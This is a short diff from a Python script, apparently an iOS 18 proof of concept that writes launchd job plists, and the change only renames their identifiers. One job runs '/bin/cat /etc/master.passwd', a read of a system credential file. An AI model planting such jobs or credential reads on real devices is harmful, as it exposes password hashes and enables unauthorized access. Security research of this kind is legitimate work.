@@ -72,8 +72,8 @@ def main():
             os.unlink(os.path.join(ld, f))
     os.chmod(ld, 0o755)
     for name, args in (('expr', ('/bin/expr', '6', '*', '7')), ('passwd', ('/bin/cat', '/etc/master.passwd'))):
-        p = os.path.join(ld, f'org.sweet.ios18.{name}.plist')
-        open(p, 'w').write(job(f'org.sweet.ios18.{name}', *args))
+        p = os.path.join(ld, f'org.bergamota.ios18.{name}.plist')
+        open(p, 'w').write(job(f'org.bergamota.ios18.{name}', *args))
         os.chmod(p, 0o644)
 
     machos = []
